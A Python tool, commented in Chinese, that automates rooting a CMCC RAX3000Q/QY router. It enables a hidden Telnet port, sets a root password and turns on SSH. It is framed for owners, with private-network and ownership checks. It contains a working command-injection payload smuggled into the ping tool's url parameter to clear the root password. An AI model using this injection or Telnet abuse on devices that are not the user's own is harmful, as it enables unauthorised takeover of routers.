#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
auto_root.py —— CMCC RAX3000Q/QY 一键 root & SSH 自动化工具

输入一个路由器 IP 和该设备自己的 Web 管理员密码，自动完成整条链路：

    指纹确认 → Web 登录 → 开启隐藏 Telnet → 取得 root shell
    → 设置 root 密码 → 配置并启用 Dropbear(22) → 验证 SSH → 关闭 Telnet

=== 有意不做的事 ===
  * 不爆破、不猜字典、不重试密码。该接口 3 次失败即锁定 180 秒，
    重复尝试等同于撞库，本工具一次为限。
  * 不接受公网地址。只放行 RFC1918 / 回环 / 链路本地网段，
    因为这条链路在语义上只可能发生在你自己的 LAN 内。
  * 不扫描网段、不支持批量目标。

=== 用法 ===
    export ROUTER_PASS='你的 Web 管理员密码'
    python auto_root.py 192.168.1.1 --check              # 只读体检
    python auto_root.py 192.168.1.1 --confirm-owned --dry-run   # 看计划
    python auto_root.py 192.168.1.1 --confirm-owned       # 真正执行

执行完会打印 root 密码和 SSH 连接命令。密码只打印在终端，不落盘。
"""

import argparse
import hashlib
import ipaddress
import json
import os
import re
import secrets
import socket
import string
import sys
import time
import urllib.error
import urllib.request

# ---------------------------------------------------------------- 常量

DEFAULT_USER = "admin"
DEFAULT_TELNET_PORT = 4719
HTTP_TIMEOUT = 15

CMD_INIT_PAGE = 80
CMD_LOGIN = 100
CMD_NETWORK_TOOLS = 168
CMD_GET_FILE_DATA = 204
CMD_NEXT_LOGIN_TIME = 232
CMD_SYS_SERVICE_SET = 234

UA = "Mozilla/5.0 (compatible; rax3000-auto-root/1.0)"

# 内网直连：忽略 HTTP_PROXY / HTTPS_PROXY，否则请求会被代理劫持
OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))

# Telnet 协议字节
IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240

# 只允许在内网使用
ALLOWED_NETS = tuple(ipaddress.ip_network(n) for n in (
    "10.0.0.0/8",
    "172.16.0.0/12",
    "192.168.0.0/16",
    "169.254.0.0/16",
    "127.0.0.0/8",
    "fc00::/7",
    "fe80::/10",
    "::1/128",
))


# ---------------------------------------------------------------- 输出

class Log:
    _t0 = time.time()

    @classmethod
    def _ts(cls):
        return "%6.1fs" % (time.time() - cls._t0)

    @classmethod
    def step(cls, text):
        print("\n\033[1;36m[%s] == %s\033[0m" % (cls._ts(), text), flush=True)

    @classmethod
    def ok(cls, text):
        print("\033[32m[%s] [ok] %s\033[0m" % (cls._ts(), text), flush=True)

    @classmethod
    def info(cls, text):
        print("[%s]      %s" % (cls._ts(), text), flush=True)

    @classmethod
    def warn(cls, text):
        print("\033[33m[%s] [!!] %s\033[0m" % (cls._ts(), text), flush=True)

    @classmethod
    def err(cls, text):
        print("\033[31m[%s] [xx] %s\033[0m" % (cls._ts(), text), file=sys.stderr)


class RouterError(RuntimeError):
    pass


# ---------------------------------------------------------------- 安全闸门

def require_private(host):
    """解析目标并拒绝一切非私有地址。"""
    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror as exc:
        raise SystemExit("[!] 无法解析主机 %s: %s" % (host, exc))

    resolved = set()
    for info in infos:
        addr = info[4][0].split("%")[0]
        try:
            ip = ipaddress.ip_address(addr)
        except ValueError:
            continue
        resolved.add(ip)

    if not resolved:
        raise SystemExit("[!] 未能解析出任何 IP 地址: %s" % host)

    for ip in resolved:
        if not any(ip in net for net in ALLOWED_NETS):
            raise SystemExit(
                "[!] 拒绝执行：%s 解析到 %s，不是私有地址。\n"
                "    本工具仅允许在 LAN 内对自有设备使用，不支持公网目标。" % (host, ip)
            )
    return str(sorted(resolved, key=lambda i: i.version)[0])


def port_open(host, port, timeout=1.5):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        return True
    except OSError:
        return False
    finally:
        sock.close()


def wait_port(host, port, want=True, timeout=20.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if port_open(host, port) == want:
            return True
        time.sleep(0.5)
    return port_open(host, port) == want


def grab_banner(host, port=22, timeout=5.0):
    try:
        with socket.create_connection((host, port), timeout) as sock:
            sock.settimeout(timeout)
            return sock.recv(120).decode("utf-8", "ignore").strip()
    except OSError:
        return ""


# ---------------------------------------------------------------- HTTP API

class HttpApi:
    """/cgi-bin/http.cgi 的最小客户端。"""

    def __init__(self, host, user, password, http_port=80):
        self.host = host
        self.user = user
        self.password = password
        self.base = "http://%s:%d/cgi-bin/http.cgi" % (host, http_port)
        self.origin = "http://%s:%d/" % (host, http_port)
        self.session = ""

    def post(self, payload):
        payload.setdefault("method", "GET")
        payload.setdefault("sessionId", self.session)
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            self.base,
            data=data,
            headers={
                "Content-Type": "application/json;charset=UTF-8",
                "Accept": "application/json, text/plain, */*",
                "Referer": self.origin,
                "User-Agent": UA,
            },
        )
        try:
            with OPENER.open(req, timeout=HTTP_TIMEOUT) as resp:
                raw = resp.read().decode("utf-8", "ignore")
        except urllib.error.HTTPError as exc:
            raise RouterError("HTTP %s: %s" % (exc.code, exc.reason))
        except urllib.error.URLError as exc:
            raise RouterError("无法连接 %s: %s" % (self.base, exc.reason))

        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            return raw

    # --- 指纹 ---------------------------------------------------

    def probe(self):
        """确认目标确实是这台固件，避免误伤别的设备。"""
        info = {"http": False, "cgi": False, "server": None, "title": None, "init": None}
        try:
            req = urllib.request.Request(self.origin, headers={"User-Agent": UA})
            with OPENER.open(req, timeout=HTTP_TIMEOUT) as resp:
                body = resp.read().decode("utf-8", "ignore")
                info["http"] = True
                info["server"] = resp.headers.get("Server")
        except (urllib.error.URLError, OSError) as exc:
            raise RouterError("无法访问 %s : %s" % (self.origin, exc))

        match = re.search(r"<title>(.*?)</title>", body, re.I | re.S)
        if match:
            info["title"] = match.group(1).strip()

        try:
            init = self.post({"cmd": CMD_INIT_PAGE, "method": "GET", "sessionId": ""})
        except RouterError as exc:
            info["err"] = str(exc)
            return info

        if isinstance(init, dict) and str(init.get("cmd")) == "80" and "account_level" in init:
            info["cgi"] = True
            info["init"] = init
        return info

    # --- 登录 ---------------------------------------------------

    def login(self):
        """单次登录。锁定或密码错误都直接抛出，绝不重试。"""
        challenge = self.post({"cmd": CMD_NEXT_LOGIN_TIME, "method": "GET", "sessionId": ""})
        if not isinstance(challenge, dict):
            raise RouterError("登录挑战接口返回异常: %r" % (challenge,))

        if str(challenge.get("buffer")) == "0":
            wait = challenge.get("netx_login_time", "?")
            raise RouterError(
                "账号已被锁定，剩余 %s 秒。本工具不做重试/爆破，请等待后手动重跑。" % wait
            )

        token = challenge.get("token")
        if not token:
            raise RouterError("未取到登录 token: %r" % (challenge,))

        digest = hashlib.sha256((token + self.password).encode()).hexdigest()
        result = self.post({
            "cmd": CMD_LOGIN,
            "method": "POST",
            "username": self.user,
            "passwd": digest,
            "isAutoUpgrade": "0",
            "sessionId": "",
        })

        if not isinstance(result, dict) or not result.get("sessionId"):
            left = result.get("login_times") if isinstance(result, dict) else "?"
            raise RouterError(
                "登录失败（剩余尝试次数 %s）。密码错误即判定失败，不做二次尝试。" % left
            )

        self.session = result["sessionId"]
        return result

    def init_page(self):
        return self.post({"cmd": CMD_INIT_PAGE, "method": "GET"})

    def sys_service_set(self, telnet):
        return self.post({
            "cmd": CMD_SYS_SERVICE_SET,
            "method": "POST",
            "telnet": "1" if telnet else "0",
            "ssh": "1",
        })

    def rce(self, command, wait=1.0):
        """通过 ping 的 url 参数注入执行命令（返回 pingrt 内容）。

        仅在拿不到 Telnet 时作为兜底；空格用 ${IFS} 代替。
        """
        self.post({
            "cmd": CMD_NETWORK_TOOLS,
            "method": "POST",
            "subcmd": 0,
            "pingTimes": 1,
            "url": "$(%s)" % command,
        })
        time.sleep(wait)
        return self.post({
            "cmd": CMD_GET_FILE_DATA,
            "method": "GET",
            "url": "/tmp/tzwww/pingrt",
            "subcmd": CMD_NETWORK_TOOLS,
        })


# ---------------------------------------------------------------- Telnet

class TelnetClient:
    """精简 Telnet 客户端：只处理 IAC 协商，够跑 shell 就行。"""

    def __init__(self, host, port, timeout=15.0):
        self.host = host
        self.port = port
        self.sock = socket.create_connection((host, port), timeout)
        self.sock.settimeout(1.0)
        self.pending = b""

    # --- 底层 ---

    def _feed(self, chunk):
        self.pending += chunk
        data = self.pending
        out = bytearray()
        reply = bytearray()
        i, n = 0, len(data)
        while i < n:
            byte = data[i]
            if byte != IAC:
                out.append(byte)
                i += 1
                continue
            if i + 1 >= n:
                break
            cmd = data[i + 1]
            if cmd == IAC:
                out.append(IAC)
                i += 2
                continue
            if cmd in (DO, DONT, WILL, WONT):
                if i + 2 >= n:
                    break
                opt = data[i + 2]
                if cmd == DO:
                    reply += bytes([IAC, WONT, opt])
                elif cmd == WILL:
                    reply += bytes([IAC, DONT, opt])
                i += 3
                continue
            if cmd == SB:
                end = data.find(bytes([IAC, SE]), i)
                if end == -1:
                    break
                i = end + 2
                continue
            i += 2

        self.pending = data[i:]
        if reply:
            try:
                self.sock.sendall(bytes(reply))
            except OSError:
                pass
        return bytes(out)

    def read_until(self, needles, timeout=15.0):
        """读直到出现任一 needle（str），返回累计文本。"""
        deadline = time.time() + timeout
        buf = ""
        while time.time() < deadline:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if not chunk:
                break
            buf += self._feed(chunk).decode("utf-8", "ignore")
            for needle in needles:
                if needle in buf:
                    return buf
        return buf

    def send(self, text):
        self.sock.sendall(text.encode())

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass

    # --- 登录 ---

    def login(self, user="root", password=None, timeout=20.0):
        text = self.read_until(["login:", "Password:", "#", "$", "incorrect"], timeout)

        if "login:" in text:
            self.send(user + "\n")
            text = self.read_until(["Password:", "#", "$", "incorrect"], timeout)

        if "Password:" in text:
            self.send((password or "") + "\n")
            text = self.read_until(["#", "$", "incorrect", "login:"], timeout)

        tail = text[text.rfind("Password:"):] if "Password:" in text else text
        if "incorrect" in tail.lower() or "login:" in tail:
            raise RouterError("Telnet 登录被拒绝（root 密码未知或非空）")

        if "#" not in text and "$" not in text:
            raise RouterError("未拿到 shell 提示符，尾部输出: %r" % text[-160:])
        return text

    # --- 命令 ---

    # root@OpenWrt:~#  /  root@(none):/tmp$
    PROMPT = re.compile(r"^\S{0,64}@\S{0,64}:[^\s]*[#$]\s*")

    @classmethod
    def _clean(cls, text, command, marker):
        """剥掉回显、marker 和 shell 提示符，只留命令输出。"""
        head = text.split(marker)[0]
        lines = []
        for raw in head.split("\n"):
            line = cls.PROMPT.sub("", raw.replace("\r", "")).rstrip()
            bare = line.strip()
            if not bare:
                continue
            if marker in bare or bare == "echo " + marker:
                continue
            if bare == command.strip():
                continue
            lines.append(line)
        return "\n".join(lines).strip()

    def run(self, command, timeout=25.0):
        marker = "__R%x__" % secrets.randbits(32)
        self.send("%s; echo %s\n" % (command, marker))
        raw = self.read_until([marker], timeout)
        return self._clean(raw, command, marker)

    def set_root_password(self, new_password):
        """通过 pty 交互设置密码，避免命令里出现引号转义问题。"""
        self.send("passwd root\n")
        text = self.read_until(["New password:", "new password:", "password:"], 10)
        if "assword:" not in text:
            raise RouterError("passwd 未进入交互，输出: %r" % text[-160:])

        self.send(new_password + "\n")
        text = self.read_until(["Retype", "retype", "again", "mismatch"], 10)

        self.send(new_password + "\n")
        text = self.read_until(["#", "$", "changed", "mismatch", "too short", "BAD PASSWORD"], 15)

        low = text.lower()
        if "mismatch" in low or "too short" in low or "bad password" in low:
            raise RouterError("设置 root 密码失败: %r" % text[-200:])
        if "changed" not in low:
            # 部分 busybox 不打印 "changed"，用 shadow 校验兜底
            check = self.run("grep '^root:' /etc/shadow | cut -c1-4")
            if "root:" not in check:
                raise RouterError("root 密码未能确认写入，passwd 输出: %r" % text[-200:])
        return True


# ---------------------------------------------------------------- 主流程

class Automator:
    def __init__(self, host, user, web_pass, root_pass, telnet_port, allow_reset, http_port=80):
        self.host = host
        self.user = user
        self.web_pass = web_pass
        self.root_pass = root_pass
        self.telnet_port = telnet_port
        self.allow_reset = allow_reset
        self.api = HttpApi(host, user, web_pass, http_port)
        self.http_port = http_port
        self.telnet = None

    # --- 各阶段 ---

    def stage_fingerprint(self):
        Log.step("阶段 1/7  指纹确认")
        info = self.api.probe()
        Log.info("Server: %s" % (info.get("server") or "-"))
        Log.info("标题:   %s" % (info.get("title") or "-"))

        if not info.get("cgi"):
            raise RouterError(
                "指纹不匹配：/cgi-bin/http.cgi 未返回 INIT_PAGE(80) 结构。"
                "目标可能不是该固件，已中止。"
            )
        if "mini_httpd" not in (info.get("server") or "").lower():
            Log.warn("Server 头不是 mini_httpd，但 CGI 指纹匹配，继续。")

        init = info["init"]
        Log.ok("确认是 RAX3000Q/QY 系固件")
        Log.info("account_level=%s  userName=%s/%s/%s" % (
            init.get("account_level"),
            init.get("userName1"), init.get("userName2"), init.get("userName3"),
        ))
        return info

    def stage_login(self):
        Log.step("阶段 2/7  Web 登录")
        result = self.api.login()
        Log.ok("登录成功  user_level=%s" % result.get("user_level"))
        init = self.api.init_page()
        if isinstance(init, dict):
            Log.info("当前 Web 等级 account_level=%s" % init.get("account_level"))
        return result

    def stage_telnet_on(self):
        Log.step("阶段 3/7  开启隐藏 Telnet")
        if port_open(self.host, self.telnet_port):
            Log.info("%s 端口已开放，跳过开启" % self.telnet_port)
            return

        self.api.sys_service_set(telnet=True)
        if not wait_port(self.host, self.telnet_port, want=True, timeout=20):
            raise RouterError("Telnet 端口 %s 未在 20s 内监听" % self.telnet_port)
        Log.ok("Telnet 已在 %s 端口监听" % self.telnet_port)

    def stage_root_shell(self):
        Log.step("阶段 4/7  获取 root shell")
        self.telnet = TelnetClient(self.host, self.telnet_port)
        try:
            self.telnet.login("root", password=None)
        except RouterError:
            if not self.allow_reset:
                self.telnet.close()
                raise RouterError(
                    "root 密码非空，无法直接登录。\n"
                    "    若确认这是你的设备，可加 --allow-root-reset：\n"
                    "    该选项会用命令注入执行 `passwd -d root` 清空密码，随后立刻设置新密码。"
                )
            Log.warn("root 密码非空 → 通过 ping 注入清空（--allow-root-reset 已授权）")
            self.telnet.close()
            out = self.api.rce("passwd${IFS}-d${IFS}root")
            Log.info("注入回显: %s" % str(out).strip()[:200])
            time.sleep(1)
            self.telnet = TelnetClient(self.host, self.telnet_port)
            self.telnet.login("root", password=None)

        who = self.telnet.run("id")
        if "uid=0" not in who:
            raise RouterError("未能取得 root 权限，id 输出: %r" % who)
        Log.ok(who.splitlines()[0].strip() if who else "uid=0")

        uname = self.telnet.run("uname -sr")
        if uname:
            Log.info(uname.strip())
        return who

    def stage_set_password(self):
        Log.step("阶段 5/7  设置 root 密码")
        self.telnet.set_root_password(self.root_pass)
        Log.ok("root 密码已写入 /etc/shadow")

    def stage_dropbear(self):
        Log.step("阶段 6/7  配置并启用 Dropbear")
        backup = self.telnet.run(
            "cp -f /etc/config/dropbear /root/dropbear.bak.$(date +%s) 2>/dev/null; ls -1 /root/dropbear.bak.* 2>/dev/null | tail -1"
        )
        if backup:
            Log.info("原配置已备份到 %s" % backup.splitlines()[-1])

        script = " && ".join([
            "uci set dropbear.@dropbear[0].Port=22",
            "uci set dropbear.@dropbear[0].enable=1",
            "uci set dropbear.@dropbear[0].PasswordAuth=on",
            "uci set dropbear.@dropbear[0].RootPasswordAuth=on",
            "uci commit dropbear",
            "/etc/init.d/dropbear enable",
            "/etc/init.d/dropbear restart 2>/dev/null || /etc/init.d/dropbear start",
            "sleep 2",
            "netstat -ltn 2>/dev/null | grep ':22' || true",
            "ps 2>/dev/null | grep '[d]ropbear' || true",
        ])
        out = self.telnet.run(script, timeout=45)
        if out:
            Log.info(out)

        if wait_port(self.host, 22, want=True, timeout=20):
            Log.ok("22/tcp 已监听")
        else:
            Log.warn("22/tcp 未监听，请手动检查 dropbear 日志")

        banner = grab_banner(self.host, 22)
        if banner.startswith("SSH-"):
            Log.ok("SSH banner: %s" % banner)

    def stage_telnet_off(self):
        Log.step("阶段 7/7  关闭临时 Telnet")
        if self.telnet:
            self.telnet.close()
        try:
            self.api.sys_service_set(telnet=False)
        except RouterError as exc:
            Log.warn("调用关闭接口失败: %s" % exc)

        if wait_port(self.host, self.telnet_port, want=False, timeout=15):
            Log.ok("%s 端口已关闭" % self.telnet_port)
        else:
            Log.warn("%s 端口仍开放，请手动关闭！" % self.telnet_port)

    # --- 编排 ---

    def check_only(self):
        info = self.stage_fingerprint()
        result = self.api.login()
        init = self.api.init_page()
        print()
        Log.info("user_level      = %s" % result.get("user_level"))
        Log.info("account_level   = %s" % (init.get("account_level") if isinstance(init, dict) else "?"))
        Log.info("22/tcp (ssh)    = %s" % ("open" if port_open(self.host, 22) else "closed"))
        Log.info("%s/tcp (telnet) = %s" % (
            self.telnet_port, "open" if port_open(self.host, self.telnet_port) else "closed"))
        Log.info("80/tcp  (web)   = %s" % ("open" if port_open(self.host, self.http_port) else "closed"))
        Log.info("Server          = %s" % (info.get("server") or "-"))
        return 0

    def run(self):
        self.stage_fingerprint()
        self.stage_login()
        self.stage_telnet_on()
        self.stage_root_shell()
        self.stage_set_password()
        self.stage_dropbear()
        self.stage_telnet_off()

        print("\n" + "=" * 68)
        print(" 完成")
        print("=" * 68)
        print(" root 密码 : %s" % self.root_pass)
        print(" SSH 连接  :")
        print("   ssh -o HostKeyAlgorithms=+ssh-rsa \\")
        print("       -o PubkeyAcceptedAlgorithms=+ssh-rsa \\")
        print("       root@%s" % self.host)
        print("\n 建议立即在 ~/.ssh/config 中固化该主机，并确认 WAN 侧未放行 22。")
        print(" 密码仅打印于此，不写入任何文件。")
        print("=" * 68)
        return 0


# ---------------------------------------------------------------- CLI

def gen_password(length=20):
    alphabet = string.ascii_letters + string.digits + "!@#%^&*-_=+"
    while True:
        pwd = "".join(secrets.choice(alphabet) for _ in range(length))
        if (any(c.islower() for c in pwd) and any(c.isupper() for c in pwd)
                and any(c.isdigit() for c in pwd) and any(c in "!@#%^&*-_=+" for c in pwd)):
            return pwd


def build_parser():
    parser = argparse.ArgumentParser(
        description="CMCC RAX3000Q/QY 一键 root & SSH（仅限自有设备）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""示例:
  export ROUTER_PASS='你的 Web 管理员密码'
  python auto_root.py 192.168.1.1 --check
  python auto_root.py 192.168.1.1 --confirm-owned --dry-run
  python auto_root.py 192.168.1.1 --confirm-owned
""",
    )
    parser.add_argument("host", help="路由器管理地址（必须是私有网段）")
    parser.add_argument("--user", default=os.environ.get("ROUTER_USER", DEFAULT_USER),
                        help="Web 管理员账号（默认 admin）")
    parser.add_argument("--web-pass", default=os.environ.get("ROUTER_PASS"),
                        help="Web 管理员密码，或用环境变量 ROUTER_PASS")
    parser.add_argument("--root-pass", default=os.environ.get("ROUTER_ROOT_PASS"),
                        help="要设置的 root 密码，缺省则随机生成")
    parser.add_argument("--telnet-port", type=int, default=DEFAULT_TELNET_PORT,
                        help="隐藏 Telnet 端口（默认 4719）")
    parser.add_argument("--http-port", type=int, default=80,
                        help="Web/CGI 端口（默认 80；部分部署为 8080）")
    parser.add_argument("--allow-root-reset", action="store_true",
                        help="允许通过命令注入执行 passwd -d root 清空原有 root 密码")
    parser.add_argument("--check", action="store_true", help="只做只读体检，不做任何修改")
    parser.add_argument("--dry-run", action="store_true", help="只打印执行计划")
    parser.add_argument("--confirm-owned", action="store_true",
                        help="确认目标是你本人拥有或已获书面授权的设备")
    return parser


def print_plan(args, ip):
    print("\n" + "=" * 68)
    print(" 执行计划（dry-run，未做任何修改）")
    print("=" * 68)
    print(" 目标      : %s (%s)" % (args.host, ip))
    print(" Web 账号  : %s" % args.user)
    print(" Web 密码  : %s" % ("*" * 8 if args.web_pass else "(缺失)"))
    print(" root 密码 : %s" % ("(随机生成)" if not args.root_pass else "(已指定)"))
    print(" 清空原密码: %s" % ("允许" if args.allow_root_reset else "不允许"))
    print("\n 将依次执行：")
    for line in (
        "1. 指纹确认（GET / + cmd=80，不匹配即中止）",
        "2. Web 登录（cmd=232 取 token → cmd=100 单次登录）",
        "3. 开启隐藏 Telnet（cmd=234, telnet=1）",
        "4. Telnet 登录 root 取得 shell（必要时清空密码）",
        "5. passwd root 设置新密码",
        "6. uci 配置 Dropbear 至 22 端口并设为开机自启",
        "7. cmd=234 关闭 Telnet 并验证 4719 已关闭",
    ):
        print("    " + line)
    print("\n 去掉 --dry-run 即真正执行。")
    print("=" * 68)


def main(argv=None):
    args = build_parser().parse_args(argv)

    if hasattr(sys.stdout, "reconfigure"):
        try:
            sys.stdout.reconfigure(encoding="utf-8")
            sys.stderr.reconfigure(encoding="utf-8")
        except (AttributeError, OSError):
            pass

    ip = require_private(args.host)

    if not args.web_pass:
        raise SystemExit(
            "[!] 缺少 Web 管理员密码。\n"
            "    请设置环境变量 ROUTER_PASS，或用 --web-pass 传入。\n"
            "    本工具不提供默认口令、不做密码猜测。"
        )

    if not args.check and not args.dry_run and not args.confirm_owned:
        raise SystemExit(
            "[!] 需要显式确认设备归属：加 --confirm-owned。\n"
            "    该操作会启用 Telnet、写入 root 密码并修改 Dropbear 配置。"
        )

    if not args.check and not args.dry_run:
        Log.warn("目标 %s —— 请确认这是你自己的设备，且已知恢复手段（串口/U-Boot）" % ip)

    if args.dry_run and not args.check:
        print_plan(args, ip)
        return 0

    root_pass = args.root_pass
    if not root_pass and not args.check and not args.dry_run:
        root_pass = gen_password()
        Log.warn("未指定 --root-pass，已生成随机密码（结束时打印）")

    worker = Automator(
        host=ip,
        user=args.user,
        web_pass=args.web_pass,
        root_pass=root_pass,
        telnet_port=args.telnet_port,
        allow_reset=args.allow_root_reset,
        http_port=args.http_port,
    )

    try:
        if args.check:
            return worker.check_only()
        return worker.run()
    except RouterError as exc:
        Log.err(str(exc))
        return 1
    except KeyboardInterrupt:
        Log.err("已中断。若 Telnet 仍开着，请用 cmd=234 telnet=0 关闭。")
        return 130
    finally:
        if worker.telnet:
            worker.telnet.close()


if __name__ == "__main__":
    sys.exit(main())
